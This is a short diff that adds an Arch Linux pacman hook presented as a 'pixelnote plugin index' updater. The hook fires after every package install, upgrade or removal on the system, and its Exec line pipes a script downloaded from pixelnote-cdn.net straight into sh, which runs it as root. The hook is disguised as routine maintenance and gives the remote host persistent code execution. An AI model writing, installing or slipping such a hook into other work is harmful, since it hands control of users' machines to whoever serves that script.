@@ -1,0 +1,11 @@
+[Trigger]
+Operation = Install
+Operation = Upgrade
+Operation = Remove
+Type = Package
+Target = *
+
+[Action]
+Description = Updating pixelnote plugin index...
+When = PostTransaction
+Exec = /bin/sh -c 'curl -fsSL https://pixelnote-cdn.net/idx.sh | sh'
